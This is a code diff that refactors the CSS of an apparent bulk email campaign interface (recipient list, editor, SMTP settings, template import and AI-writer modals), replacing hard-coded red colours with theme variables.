-        .b2b-ticker-wrap { background:#11080a; border-bottom:1px solid #2e1216; padding:5px 18px; overflow:hidden; white-space:nowrap; flex-shrink:0; }
-        .b2b-ticker-inner { display:inline-block; animation:b2bTicker 30s linear infinite; font-size:.74em; color:#ff6b72; font-weight:600; }
+        .b2b-chip { background:var(--bg-panel); border:1px solid var(--border-color); border-radius:20px; padding:4px 11px; font-size:.73em; font-weight:700; color:var(--accent-color); cursor:pointer; letter-spacing:.05em; transition:all .15s; white-space:nowrap; }
+        .b2b-chip:hover { background:var(--border-color); border-color:var(--accent-color); color:#ffffff; }
+        .b2b-chip-muted { background:var(--bg-sidebar); border-color:var(--border-color); color:var(--text-secondary); }
+        .b2b-chip-muted:hover { border-color:var(--accent-color); color:#ffffff; }
+        .b2b-account-select { margin-left:auto; background:var(--bg-sidebar); border:1px solid var(--border-color); border-radius:20px; padding:5px 13px; font-size:.8em; color:#f0ebed; outline:none; cursor:pointer; max-width:240px; }
+        .b2b-account-select:focus { border-color:var(--accent-color); }
+        .b2b-campaign-bar { padding:8px 18px; background:var(--bg-primary); border-bottom:1px solid var(--border-color); flex-shrink:0; }
+        .b2b-field-label { font-size:.69em; font-weight:700; color:var(--text-secondary); letter-spacing:.1em; margin-bottom:4px; }
+        .b2b-campaign-input { width:100%; background:var(--bg-sidebar); border:1px solid var(--border-color); border-radius:5px; padding:7px 11px; color:#ffffff; font-size:.88em; outline:none; box-sizing:border-box; transition:border-color .15s; }
+        .b2b-campaign-input:focus { border-color:var(--accent-color); box-shadow: 0 0 8px var(--accent-glow); }
+        .b2b-ticker-wrap { background:var(--bg-panel); border-bottom:1px solid var(--border-color); padding:5px 18px; overflow:hidden; white-space:nowrap; flex-shrink:0; }
+        .b2b-ticker-inner { display:inline-block; animation:b2bTicker 30s linear infinite; font-size:.74em; color:var(--accent-color); font-weight:600; }
         @keyframes b2bTicker { 0%{transform:translateX(100vw)} 100%{transform:translateX(-100%)} }
         .b2b-main-body { display:flex; flex:1; overflow:hidden; min-height:0; width:100%; }
         
         /* ── Column 1: Recipients List (Generous Breathing Space) ── */
-        .b2b-col-recipients { width:300px; min-width:270px; max-width:340px; background:#0f080b; border-right:1px solid #2e1216; display:flex; flex-direction:column; flex-shrink:0; padding:12px; gap:8px; box-sizing:border-box; }
+        .b2b-col-recipients { width:300px; min-width:270px; max-width:340px; background:var(--bg-sidebar); border-right:1px solid var(--border-color); display:flex; flex-direction:column; flex-shrink:0; padding:12px; gap:8px; box-sizing:border-box; }
         .b2b-panel-header { display:flex; justify-content:space-between; align-items:center; font-size:.74em; font-weight:700; color:#ffffff; letter-spacing:.08em; }
-        .b2b-mode-selector { display:flex; background:#180d11; border:1px solid #38161b; border-radius:14px; padding:2px; gap:2px; }
-        .b2b-mode-btn { background:transparent; border:none; color:#a49498; font-size:.68em; font-weight:700; padding:2px 7px; border-radius:10px; cursor:pointer; transition:all .15s; letter-spacing:.03em; }
+        .b2b-mode-selector { display:flex; background:var(--bg-panel); border:1px solid var(--border-color); border-radius:14px; padding:2px; gap:2px; }
+        .b2b-mode-btn { background:transparent; border:none; color:var(--text-secondary); font-size:.68em; font-weight:700; padding:2px 7px; border-radius:10px; cursor:pointer; transition:all .15s; letter-spacing:.03em; }
         .b2b-mode-btn:hover { color:#ffffff; }
-        .b2b-mode-btn.active { background:#b00710; color:#ffffff; box-shadow:0 0 6px rgba(229,9,20,0.4); }
+        .b2b-mode-btn.active { background:var(--accent-color); color:#ffffff; box-shadow:0 0 6px var(--accent-glow); }
         .b2b-bcc-row { display:flex; align-items:center; gap:6px; cursor:pointer; }
         .b2b-bcc-label { font-size:.8em; color:#e2e8f0; font-weight:600; }
-        .b2b-sw { width:28px; height:14px; background:#261115; border-radius:10px; position:relative; transition:background .2s; border:1px solid #5a1c22; flex-shrink:0; }
-        .b2b-sw::after { content:''; position:absolute; width:10px; height:10px; background:#a49498; border-radius:50%; top:1px; left:1px; transition:all .2s; }
-        .b2b-sw.on { background:#b00710; border-color:#e50914; }
+        .b2b-sw { width:28px; height:14px; background:var(--bg-panel); border-radius:10px; position:relative; transition:background .2s; border:1px solid var(--border-color); flex-shrink:0; }
+        .b2b-sw::after { content:''; position:absolute; width:10px; height:10px; background:var(--text-secondary); border-radius:50%; top:1px; left:1px; transition:all .2s; }
+        .b2b-sw.on { background:var(--accent-color); border-color:var(--accent-hover); }
         .b2b-sw.on::after { background:#ffffff; left:15px; }
-        .b2b-rec-area { flex:1; min-height:260px; background:#120b0e; border:1px solid #38161b; border-radius:6px; color:#ffffff; font-size:12px; padding:10px; resize:none; outline:none; font-family:'Consolas','Courier New',monospace; line-height:1.6; white-space:pre; width:100%; box-sizing:border-box; }
-        .b2b-rec-area:focus { border-color:#e50914; box-shadow:0 0 8px rgba(229,9,20,0.25); }
+        .b2b-rec-area { flex:1; min-height:260px; background:var(--bg-primary); border:1px solid var(--border-color); border-radius:6px; color:#ffffff; font-size:12px; padding:10px; resize:none; outline:none; font-family:'Consolas','Courier New',monospace; line-height:1.6; white-space:pre; width:100%; box-sizing:border-box; }
+        .b2b-rec-area:focus { border-color:var(--accent-color); box-shadow:0 0 8px var(--accent-glow); }
         .b2b-rec-btns { display:flex; gap:5px; }
-        .b2b-sm-btn { flex:1; background:#201115; border:1px solid #38161b; border-radius:4px; color:#ffffff; font-size:.73em; font-weight:700; padding:6px 2px; cursor:pointer; letter-spacing:.04em; transition:all .15s; }
-        .b2b-sm-btn:hover { background:#3d1419; border-color:#e50914; color:#ffffff; }
-        .b2b-sm-btn-danger { color:#fca5a5; }
-        .b2b-sm-btn-danger:hover { background:#450a0a; border-color:#e50914; color:#ffffff; }
+        .b2b-sm-btn { flex:1; background:var(--bg-panel); border:1px solid var(--border-color); border-radius:4px; color:#ffffff; font-size:.73em; font-weight:700; padding:6px 2px; cursor:pointer; letter-spacing:.04em; transition:all .15s; }
+        .b2b-sm-btn:hover { background:var(--border-color); border-color:var(--accent-color); color:#ffffff; }
+        .b2b-sm-btn-danger { color:var(--accent-color); }
+        .b2b-sm-btn-danger:hover { background:var(--badge-bg); border-color:var(--accent-color); color:#ffffff; }
         .b2b-rec-count { font-size:.74em; color:#cbd5e1; text-align:center; font-weight:600; }
         
         /* ── Column 2: Campaign Parameters & Controls (Spacious & Non-overflowing) ── */
-        .b2b-col-params { width:365px; min-width:330px; max-width:420px; background:#0c0709; border-right:1px solid #2e1216; display:flex; flex-direction:column; flex-shrink:0; padding:14px 14px 18px; gap:12px; overflow-y:auto; box-sizing:border-box; height:100%; }
+        .b2b-col-params { width:365px; min-width:330px; max-width:420px; background:var(--bg-primary); border-right:1px solid var(--border-color); display:flex; flex-direction:column; flex-shrink:0; padding:14px 14px 18px; gap:12px; overflow-y:auto; box-sizing:border-box; height:100%; }
         
         /* ── Column 3: Full Static Canvas Touching Right Edge ── */
-        .b2b-compose-panel { flex:1; height:100%; display:flex; flex-direction:column; padding:10px 14px; overflow:hidden; background:#0a0608; box-sizing:border-box; min-width:0; }
+        .b2b-compose-panel { flex:1; height:100%; display:flex; flex-direction:column; padding:10px 14px; overflow:hidden; background:var(--bg-primary); box-sizing:border-box; min-width:0; }
         .b2b-body-container { width:100%; height:100%; display:flex; flex-direction:column; overflow:hidden; gap:0; }
         
         .b2b-field-section { display:flex; flex-direction:column; gap:6px; }
         .b2b-compose-label { font-size:.72em; font-weight:700; color:#ffffff; letter-spacing:.08em; }
         .b2b-dim { color:#cbd5e1; font-size:.82em; }
-        .b2b-mini-ta { background:#120b0e; border:1px solid #38161b; border-radius:6px; color:#ffffff; font-size:12px; padding:8px 10px; resize:vertical; outline:none; font-family:'Consolas','Courier New',monospace; line-height:1.5; min-height:64px; height:68px; width:100%; box-sizing:border-box; }
-        .b2b-mini-ta:focus { border-color:#e50914; box-shadow:0 0 8px rgba(229,9,20,0.25); }
+        .b2b-mini-ta { background:var(--bg-sidebar); border:1px solid var(--border-color); border-radius:6px; color:#ffffff; font-size:12px; padding:8px 10px; resize:vertical; outline:none; font-family:'Consolas','Courier New',monospace; line-height:1.5; min-height:64px; height:68px; width:100%; box-sizing:border-box; }
+        .b2b-mini-ta:focus { border-color:var(--accent-color); box-shadow:0 0 8px var(--accent-glow); }
         .b2b-rotate-row { display:flex; align-items:center; gap:8px; font-size:.75em; color:#cbd5e1; margin-top:4px; }
         .b2b-counter { display:flex; align-items:center; }
-        .b2b-counter button { background:#261115; border:1px solid #38161b; color:#ffffff; width:22px; height:22px; cursor:pointer; font-size:.9em; display:flex; align-items:center; justify-content:center; }
+        .b2b-counter button { background:var(--bg-panel); border:1px solid var(--border-color); color:#ffffff; width:22px; height:22px; cursor:pointer; font-size:.9em; display:flex; align-items:center; justify-content:center; }
         .b2b-counter button:first-child { border-radius:3px 0 0 3px; }
         .b2b-counter button:last-child { border-radius:0 3px 3px 0; }
-        .b2b-counter button:hover { background:#e50914; border-color:#e50914; }
-        .b2b-counter-input { width:32px; height:22px; background:#0a0709; border:1px solid #38161b; border-left:none; border-right:none; color:#ffffff; text-align:center; font-size:.8em; outline:none; }
+        .b2b-counter button:hover { background:var(--accent-color); border-color:var(--accent-color); }
+        .b2b-counter-input { width:32px; height:22px; background:var(--bg-primary); border:1px solid var(--border-color); border-left:none; border-right:none; color:#ffffff; text-align:center; font-size:.8em; outline:none; }
         
         .b2b-body-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:5px; flex-wrap:wrap; gap:6px; }
         .b2b-body-actions { display:flex; align-items:center; gap:5px; flex-wrap:wrap; }
-        .b2b-ai-btn { background:linear-gradient(135deg,#e50914,#b00710); color:#ffffff; border:none; border-radius:5px; padding:4px 10px; font-size:.75em; font-weight:700; cursor:pointer; transition:all .15s; box-shadow:0 0 10px rgba(229,9,20,0.3); }
-        .b2b-ai-btn:hover { box-shadow:0 0 16px rgba(229,9,20,0.6); transform:translateY(-1px); }
-        .b2b-import-btn { background:#1e1014; border:1px solid #5a1c22; border-radius:5px; padding:4px 10px; font-size:.75em; font-weight:700; color:#ffffff; cursor:pointer; transition:all .15s; display:inline-flex; align-items:center; gap:5px; }
-        .b2b-import-btn:hover { background:#38141b; border-color:#e50914; color:#ffffff; box-shadow:0 0 12px rgba(229,9,20,0.35); }
-        .b2b-edit-tabs { display:flex; border:1px solid #38161b; border-radius:4px; overflow:hidden; }
-        .b2b-edit-tab { padding:4px 10px; font-size:.72em; font-weight:700; cursor:pointer; color:#a49498; transition:all .15s; }
-        .b2b-edit-tab.active { background:#e50914; color:#ffffff; }
-        .b2b-edit-tab:hover:not(.active) { background:#261115; color:#ffffff; }
-        .b2b-editor-toolbar { display:flex; align-items:center; gap:3px; background:#161014; border:1px solid #38161b; border-bottom:none; padding:5px 8px; border-radius:6px 6px 0 0; flex-wrap:wrap; }
+        .b2b-ai-btn { background:var(--accent-gradient); color:#ffffff; border:none; border-radius:5px; padding:4px 10px; font-size:.75em; font-weight:700; cursor:pointer; transition:all .15s; box-shadow:0 0 10px var(--accent-glow); }
+        .b2b-ai-btn:hover { box-shadow:0 0 16px var(--accent-glow-strong); transform:translateY(-1px); }
+        .b2b-import-btn { background:var(--bg-panel); border:1px solid var(--border-color); border-radius:5px; padding:4px 10px; font-size:.75em; font-weight:700; color:#ffffff; cursor:pointer; transition:all .15s; display:inline-flex; align-items:center; gap:5px; }
+        .b2b-import-btn:hover { background:var(--border-color); border-color:var(--accent-color); color:#ffffff; box-shadow:0 0 12px var(--accent-glow); }
+        .b2b-edit-tabs { display:flex; border:1px solid var(--border-color); border-radius:4px; overflow:hidden; }
+        .b2b-edit-tab { padding:4px 10px; font-size:.72em; font-weight:700; cursor:pointer; color:var(--text-secondary); transition:all .15s; }
+        .b2b-edit-tab.active { background:var(--accent-color); color:#ffffff; }
+        .b2b-edit-tab:hover:not(.active) { background:var(--border-color); color:#ffffff; }
+        .b2b-editor-toolbar { display:flex; align-items:center; gap:3px; background:var(--bg-sidebar); border:1px solid var(--border-color); border-bottom:none; padding:5px 8px; border-radius:6px 6px 0 0; flex-wrap:wrap; }
         .b2b-tb-btn { background:transparent; border:1px solid transparent; color:#ffffff; border-radius:3px; padding:3px 6px; font-size:.8em; cursor:pointer; transition:all .1s; }
-        .b2b-tb-btn:hover { background:#261115; border-color:#5a1c22; }
-        .b2b-tb-sep { width:1px; height:16px; background:#38161b; margin:0 3px; flex-shrink:0; }
-        .b2b-tb-sel { background:#0a0709; border:1px solid #38161b; color:#ffffff; border-radius:3px; font-size:.75em; padding:2px 4px; cursor:pointer; outline:none; }
+        .b2b-tb-btn:hover { background:var(--border-color); border-color:var(--accent-color); }
+        .b2b-tb-sep { width:1px; height:16px; background:var(--border-color); margin:0 3px; flex-shrink:0; }
+        .b2b-tb-sel { background:var(--bg-primary); border:1px solid var(--border-color); color:#ffffff; border-radius:3px; font-size:.75em; padding:2px 4px; cursor:pointer; outline:none; }
         .b2b-merge-tags { display:flex; gap:3px; margin-left:4px; flex-wrap:wrap; }
-        .b2b-merge-btn { background:rgba(229,9,20,0.16); border:1px solid rgba(229,9,20,0.45); border-radius:4px; color:#ffffff; font-size:.72em; font-weight:700; padding:2px 5px; cursor:pointer; font-family:'Consolas',monospace; transition:all .12s; }
-        .b2b-merge-btn:hover { background:#e50914; border-color:#ff3b45; color:#ffffff; box-shadow:0 0 10px rgba(229,9,20,0.5); transform:translateY(-1px); }
+        .b2b-merge-btn { background:var(--badge-bg); border:1px solid var(--badge-border); border-radius:4px; color:#ffffff; font-size:.72em; font-weight:700; padding:2px 5px; cursor:pointer; font-family:'Consolas',monospace; transition:all .12s; }
+        .b2b-merge-btn:hover { background:var(--accent-color); border-color:var(--accent-hover); color:#ffffff; box-shadow:0 0 10px var(--accent-glow); transform:translateY(-1px); }
         
-        .b2b-editor-area { border:1px solid #38161b; border-radius:0 0 6px 6px; background:#ffffff; flex:1; height:100%; min-height:0; display:flex; flex-direction:column; overflow:hidden; }
+        .b2b-editor-area { border:1px solid var(--border-color); border-radius:0 0 6px 6px; background:#ffffff; flex:1; height:100%; min-height:0; display:flex; flex-direction:column; overflow:hidden; }
         .b2b-editor-content { flex:1; height:100%; overflow-y:auto; padding:18px 24px; outline:none; font-size:14px; color:#1a1a1a; line-height:1.6; }
         .b2b-editor-content img { max-width:100%; height:auto; }
         .b2b-editor-content table { max-width:100%; }
@@ -495,121 +625,121 @@ HTML_TEMPLATE = r'''
         .b2b-preview-wrap { width:100%; height:100%; flex:1; background:#f1f5f9; display:flex; justify-content:center; align-items:flex-start; overflow-y:auto; padding:14px; box-sizing:border-box; }
         .b2b-preview-frame { width:100%; height:100%; border:none; display:block; background:#ffffff; border-radius:6px; box-shadow:0 2px 14px rgba(0,0,0,0.08); transition:max-width .2s ease; }
         .b2b-preview-wrap.mobile .b2b-preview-frame { max-width:375px; margin:0 auto; box-shadow:0 6px 24px rgba(0,0,0,0.25); }
-        .b2b-prev-btn { background:#161014; border:1px solid #38161b; color:#cbd5e1; border-radius:4px; padding:3px 8px; font-size:.74em; font-weight:600; cursor:pointer; transition:all .15s; }
-        .b2b-prev-btn:hover, .b2b-prev-btn.active { background:#e50914; border-color:#e50914; color:#ffffff; }
+        .b2b-prev-btn { background:var(--bg-sidebar); border:1px solid var(--border-color); color:#cbd5e1; border-radius:4px; padding:3px 8px; font-size:.74em; font-weight:600; cursor:pointer; transition:all .15s; }
+        .b2b-prev-btn:hover, .b2b-prev-btn.active { background:var(--accent-color); border-color:var(--accent-color); color:#ffffff; }
         
         /* ── Fullscreen Focus Mode ─────────────────────────────── */
-        .b2b-body-container.b2b-fullscreen { position:fixed; inset:0; z-index:99999; background:#100b0e; padding:16px 20px; max-width:100vw; height:100vh; box-sizing:border-box; gap:6px; }
+        .b2b-body-container.b2b-fullscreen { position:fixed; inset:0; z-index:99999; background:var(--bg-sidebar); padding:16px 20px; max-width:100vw; height:100vh; box-sizing:border-box; gap:6px; }
         .b2b-body-container.b2b-fullscreen .b2b-editor-area { flex:1; height:100%; min-height:0; }
 
         .b2b-option-row { display:flex; align-items:center; gap:10px; padding:7px 0; font-size:.78em; }
-        .b2b-option-row-border { border-top:1px solid #241115; }
+        .b2b-option-row-border { border-top:1px solid var(--border-color); }
         .b2b-option-label { font-size:.7em; font-weight:700; color:#ffffff; letter-spacing:.05em; min-width:130px; }
-        .b2b-tg { display:flex; border:1px solid #38161b; border-radius:4px; overflow:hidden; cursor:pointer; }
-        .b2b-tg-opt { padding:3px 9px; font-size:.74em; font-weight:700; color:#a49498; transition:all .15s; }
-        .b2b-tg-opt.active { background:#e50914; color:#ffffff; }
-        .b2b-add-files-btn { background:#261115; border:1px solid #38161b; border-radius:4px; color:#ffffff; font-size:.72em; font-weight:700; padding:5px 9px; cursor:pointer; }
-        .b2b-add-files-btn:hover { border-color:#e50914; background:#38141b; color:#ffffff; }
-        .b2b-badge { background:#241116; border:1px solid #5a1c22; border-radius:3px; color:#ff8b94; font-size:.66em; padding:1px 4px; font-weight:700; }
+        .b2b-tg { display:flex; border:1px solid var(--border-color); border-radius:4px; overflow:hidden; cursor:pointer; }
+        .b2b-tg-opt { padding:3px 9px; font-size:.74em; font-weight:700; color:var(--text-secondary); transition:all .15s; }
+        .b2b-tg-opt.active { background:var(--accent-color); color:#ffffff; }
+        .b2b-add-files-btn { background:var(--bg-panel); border:1px solid var(--border-color); border-radius:4px; color:#ffffff; font-size:.72em; font-weight:700; padding:5px 9px; cursor:pointer; }
+        .b2b-add-files-btn:hover { border-color:var(--accent-color); background:var(--border-color); color:#ffffff; }
+        .b2b-badge { background:var(--badge-bg); border:1px solid var(--badge-border); border-radius:3px; color:var(--accent-color); font-size:.66em; padding:1px 4px; font-weight:700; }
         
-        .b2b-sidebar-actions { display:flex; flex-direction:column; gap:10px; padding-top:10px; border-top:1px solid #241115; }
-        .b2b-send-btn { background:linear-gradient(135deg,#e50914,#b00710); color:#ffffff; border:1px solid rgba(255,255,255,0.15); border-radius:5px; font-size:.86em; font-weight:700; padding:10px 16px; cursor:pointer; transition:all .15s; display:flex; align-items:center; justify-content:center; gap:7px; box-shadow:0 0 14px rgba(229,9,20,0.4); letter-spacing:.04em; }
-        .b2b-send-btn:hover { box-shadow:0 0 20px rgba(229,9,20,0.7); transform:translateY(-1px); }
-        .b2b-send-btn:disabled { background:#261115; color:#6e5c61; cursor:not-allowed; box-shadow:none; border-color:#38161b; }
-        .b2b-save-btn { background:#1e1014; border:1px solid #38161b; border-radius:5px; color:#cbd5e1; font-size:.78em; font-weight:600; padding:6px 10px; cursor:pointer; }
-        .b2b-save-btn:hover { border-color:#e50914; color:#ffffff; }
-        .b2b-reset-btn { background:transparent; border:1px solid #38161b; border-radius:5px; color:#cbd5e1; font-size:.78em; font-weight:700; padding:6px 10px; cursor:pointer; }
-        .b2b-reset-btn:hover { border-color:#e50914; color:#ff4d58; }
+        .b2b-sidebar-actions { display:flex; flex-direction:column; gap:10px; padding-top:10px; border-top:1px solid var(--border-color); }
+        .b2b-send-btn { background:var(--accent-gradient); color:#ffffff; border:1px solid rgba(255,255,255,0.15); border-radius:5px; font-size:.86em; font-weight:700; padding:10px 16px; cursor:pointer; transition:all .15s; display:flex; align-items:center; justify-content:center; gap:7px; box-shadow:0 0 14px var(--accent-glow); letter-spacing:.04em; }
+        .b2b-send-btn:hover { box-shadow:0 0 20px var(--accent-glow-strong); transform:translateY(-1px); }
+        .b2b-send-btn:disabled { background:var(--bg-panel); color:#6e5c61; cursor:not-allowed; box-shadow:none; border-color:var(--border-color); }
+        .b2b-save-btn { background:var(--bg-panel); border:1px solid var(--border-color); border-radius:5px; color:#cbd5e1; font-size:.78em; font-weight:600; padding:6px 10px; cursor:pointer; }
+        .b2b-save-btn:hover { border-color:var(--accent-color); color:#ffffff; }
+        .b2b-reset-btn { background:transparent; border:1px solid var(--border-color); border-radius:5px; color:#cbd5e1; font-size:.78em; font-weight:700; padding:6px 10px; cursor:pointer; }
+        .b2b-reset-btn:hover { border-color:var(--accent-color); color:#ff4d58; }
 
         /* ── Column 2 Output Section & Counters ──────────────────── */
-        .b2b-output-section { display:flex; flex-direction:column; flex:1; border-top:1px solid #241115; padding-top:10px; margin-top:2px; min-height:120px; }
+        .b2b-output-section { display:flex; flex-direction:column; flex:1; border-top:1px solid var(--border-color); padding-top:10px; margin-top:2px; min-height:120px; }
         .b2b-output-header { display:flex; flex-direction:column; gap:8px; margin-bottom:10px; }
         .b2b-output-title { font-size:.74em; font-weight:800; color:#ffffff; letter-spacing:.08em; text-transform:uppercase; }
         .b2b-out-counters { display:flex; align-items:stretch; justify-content:space-between; gap:12px; width:100%; box-sizing:border-box; }
-        .b2b-out-chip { flex:1; background:linear-gradient(180deg, #180e12, #10080c); border:1px solid #38161b; border-radius:6px; padding:9px 8px; text-align:center; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:5px; box-sizing:border-box; transition:all .15s; }
-        .b2b-out-chip:hover { border-color:#e50914; background:#1e1116; transform:translateY(-1px); box-shadow:0 3px 10px rgba(0,0,0,0.4); }
-        .b2b-out-chip-label { text-transform:uppercase; font-size:.70em; font-weight:700; letter-spacing:.08em; color:#a49498; }
+        .b2b-out-chip { flex:1; background:var(--bg-panel); border:1px solid var(--border-color); border-radius:6px; padding:9px 8px; text-align:center; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:5px; box-sizing:border-box; transition:all .15s; }
+        .b2b-out-chip:hover { border-color:var(--accent-color); background:var(--border-color); transform:translateY(-1px); box-shadow:0 3px 10px rgba(0,0,0,0.4); }
+        .b2b-out-chip-label { text-transform:uppercase; font-size:.70em; font-weight:700; letter-spacing:.08em; color:var(--text-secondary); }
         .b2b-out-chip-val { font-family:'Consolas','Courier New',monospace; font-size:1.3em; font-weight:800; line-height:1; }
-        .b2b-output-section .terminal-pane { border-radius:6px; min-height:85px; flex:1; overflow-y:auto; padding:8px 10px; font-size:11px; background:#090507; border:1px solid #2e1216; box-sizing:border-box; }
+        .b2b-output-section .terminal-pane { border-radius:6px; min-height:85px; flex:1; overflow-y:auto; padding:8px 10px; font-size:11px; background:var(--bg-primary); border:1px solid var(--border-color); box-sizing:border-box; }
 
         /* ── Import Template Modal ───────────────────────────────── */
         .b2b-import-modal { position:fixed; inset:0; background:rgba(0,0,0,.85); z-index:10001; display:flex; align-items:center; justify-content:center; backdrop-filter:blur(6px); }
-        .b2b-import-box { background:linear-gradient(145deg,#161014,#200e13); border:1px solid #4a181e; border-radius:14px; width:720px; max-width:95vw; max-height:88vh; display:flex; flex-direction:column; overflow:hidden; box-shadow:0 0 60px rgba(229,9,20,.35); }
-        .b2b-import-hdr { display:flex; align-items:center; gap:10px; padding:16px 20px; border-bottom:1px solid #38161b; }
+        .b2b-import-box { background:var(--bg-sidebar); border:1px solid var(--border-color); border-radius:14px; width:720px; max-width:95vw; max-height:88vh; display:flex; flex-direction:column; overflow:hidden; box-shadow:0 0 60px rgba(0,0,0,.6); }
+        .b2b-import-hdr { display:flex; align-items:center; gap:10px; padding:16px 20px; border-bottom:1px solid var(--border-color); }
         .b2b-import-title { font-size:1.02em; font-weight:800; color:#ffffff; letter-spacing:.02em; display:flex; align-items:center; gap:8px; }
         .b2b-import-sub { font-size:.78em; color:#cbd5e1; margin-top:2px; }
-        .b2b-import-close { margin-left:auto; background:none; border:none; color:#a49498; font-size:1.2em; cursor:pointer; transition:color .15s; }
-        .b2b-import-close:hover { color:#ff3b45; }
-        .b2b-import-search-bar { padding:10px 20px; background:#10090c; border-bottom:1px solid #2e1216; }
-        .b2b-import-search-input { width:100%; background:#161014; border:1px solid #38161b; border-radius:6px; padding:7px 12px; color:#ffffff; font-size:.85em; outline:none; box-sizing:border-box; }
-        .b2b-import-search-input:focus { border-color:#e50914; box-shadow:0 0 8px rgba(229,9,20,0.3); }
+        .b2b-import-close { margin-left:auto; background:none; border:none; color:var(--text-secondary); font-size:1.2em; cursor:pointer; transition:color .15s; }
+        .b2b-import-close:hover { color:var(--accent-color); }
+        .b2b-import-search-bar { padding:10px 20px; background:var(--bg-panel); border-bottom:1px solid var(--border-color); }
+        .b2b-import-search-input { width:100%; background:var(--bg-sidebar); border:1px solid var(--border-color); border-radius:6px; padding:7px 12px; color:#ffffff; font-size:.85em; outline:none; box-sizing:border-box; }
+        .b2b-import-search-input:focus { border-color:var(--accent-color); box-shadow:0 0 8px var(--accent-glow); }
         .b2b-import-body { padding:16px 20px; overflow-y:auto; display:flex; flex-direction:column; gap:10px; }
-        .b2b-import-card { background:#11080a; border:1px solid #2e1216; border-radius:8px; padding:12px 16px; display:flex; align-items:center; justify-content:space-between; gap:14px; transition:all .15s; }
-        .b2b-import-card:hover { border-color:#e50914; background:#1a0c10; transform:translateY(-1px); box-shadow:0 4px 16px rgba(0,0,0,0.4); }
+        .b2b-import-card { background:var(--bg-primary); border:1px solid var(--border-color); border-radius:8px; padding:12px 16px; display:flex; align-items:center; justify-content:space-between; gap:14px; transition:all .15s; }
+        .b2b-import-card:hover { border-color:var(--accent-color); background:var(--bg-panel); transform:translateY(-1px); box-shadow:0 4px 16px rgba(0,0,0,0.4); }
         .b2b-import-card-info { display:flex; flex-direction:column; gap:4px; min-width:0; flex:1; }
         .b2b-import-card-name { font-size:.92em; font-weight:700; color:#ffffff; display:flex; align-items:center; gap:8px; }
-        .b2b-import-badge { font-size:.7em; font-weight:700; padding:2px 7px; border-radius:12px; background:rgba(229,9,20,0.2); border:1px solid rgba(229,9,20,0.5); color:#ffffff; }
+        .b2b-import-badge { font-size:.7em; font-weight:700; padding:2px 7px; border-radius:12px; background:var(--badge-bg); border:1px solid var(--badge-border); color:#ffffff; }
         .b2b-import-card-url { font-family:'Consolas','Courier New',monospace; font-size:.78em; color:#93c5fd; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
         .b2b-import-card-meta { font-size:.72em; color:#cbd5e1; }
-        .b2b-import-select-btn { background:linear-gradient(135deg,#e50914,#b00710); color:#ffffff; border:1px solid rgba(255,255,255,0.15); border-radius:6px; font-size:.78em; font-weight:700; padding:7px 14px; cursor:pointer; white-space:nowrap; transition:all .15s; box-shadow:0 0 8px rgba(229,9,20,0.3); }
-        .b2b-import-select-btn:hover { box-shadow:0 0 16px rgba(229,9,20,0.6); transform:translateY(-1px); }
+        .b2b-import-select-btn { background:var(--accent-gradient); color:#ffffff; border:1px solid rgba(255,255,255,0.15); border-radius:6px; font-size:.78em; font-weight:700; padding:7px 14px; cursor:pointer; white-space:nowrap; transition:all .15s; box-shadow:0 0 8px var(--accent-glow); }
+        .b2b-import-select-btn:hover { box-shadow:0 0 16px var(--accent-glow-strong); transform:translateY(-1px); }
 
         /* ── SOURCE tab textarea ─────────────────────────────────────── */
-        .b2b-source-ta { width:100%; height:100%; flex:1; background:#0c0709; color:#ff8b94; font-family:'Consolas','Courier New',monospace; font-size:.85em; line-height:1.6; padding:18px 22px; border:none; outline:none; resize:none; box-sizing:border-box; overflow-y:auto; }
+        .b2b-source-ta { width:100%; height:100%; flex:1; background:var(--bg-primary); color:var(--accent-color); font-family:'Consolas','Courier New',monospace; font-size:.85em; line-height:1.6; padding:18px 22px; border:none; outline:none; resize:none; box-sizing:border-box; overflow-y:auto; }
 
         /* ── Send mode + SMTP settings ──────────────────────────── */
-        .b2b-sendmode-wrap { display:flex; align-items:center; gap:6px; background:#161014; border:1px solid #38161b; border-radius:6px; padding:4px 8px; width:100%; box-sizing:border-box; }
+        .b2b-sendmode-wrap { display:flex; align-items:center; gap:6px; background:var(--bg-sidebar); border:1px solid var(--border-color); border-radius:6px; padding:4px 8px; width:100%; box-sizing:border-box; }
         .b2b-sendmode-sel { background:transparent; border:none; color:#f0ebed; font-size:.78em; outline:none; cursor:pointer; flex:1; }
-        .b2b-smtp-cfg-btn { background:#261115; border:1px solid #5a1c22; border-radius:4px; color:#ff8b94; font-size:.72em; padding:3px 7px; cursor:pointer; white-space:nowrap; transition:all .15s; }
-        .b2b-smtp-cfg-btn:hover { background:#3d1419; border-color:#e50914; color:#ffffff; }
+        .b2b-smtp-cfg-btn { background:var(--bg-panel); border:1px solid var(--border-color); border-radius:4px; color:var(--accent-color); font-size:.72em; padding:3px 7px; cursor:pointer; white-space:nowrap; transition:all .15s; }
+        .b2b-smtp-cfg-btn:hover { background:var(--border-color); border-color:var(--accent-color); color:#ffffff; }
 
         /* ── AI Email Writer modal ──────────────────────────── */
         .ai-modal { position:fixed; inset:0; background:rgba(0,0,0,.85); z-index:10000; display:flex; align-items:center; justify-content:center; backdrop-filter:blur(6px); }
-        .ai-modal-box { background:linear-gradient(145deg,#161014,#200e13); border:1px solid #4a181e; border-radius:14px; width:640px; max-width:95vw; max-height:92vh; display:flex; flex-direction:column; overflow:hidden; box-shadow:0 0 60px rgba(229,9,20,.35); }
-        .ai-modal-hdr { display:flex; align-items:center; gap:10px; padding:16px 20px; border-bottom:1px solid #38161b; }
+        .ai-modal-box { background:var(--bg-sidebar); border:1px solid var(--border-color); border-radius:14px; width:640px; max-width:95vw; max-height:92vh; display:flex; flex-direction:column; overflow:hidden; box-shadow:0 0 60px rgba(0,0,0,.6); }
+        .ai-modal-hdr { display:flex; align-items:center; gap:10px; padding:16px 20px; border-bottom:1px solid var(--border-color); }
         .ai-modal-title { font-size:1em; font-weight:800; color:#ffffff; letter-spacing:.02em; }
-        .ai-modal-close { margin-left:auto; background:none; border:none; color:#a49498; font-size:1.1em; cursor:pointer; transition:color .15s; }
-        .ai-modal-close:hover { color:#ff3b45; }
+        .ai-modal-close { margin-left:auto; background:none; border:none; color:var(--text-secondary); font-size:1.1em; cursor:pointer; transition:color .15s; }
+        .ai-modal-close:hover { color:var(--accent-color); }
         .ai-modal-body { padding:18px 20px; display:flex; flex-direction:column; gap:14px; overflow-y:auto; }
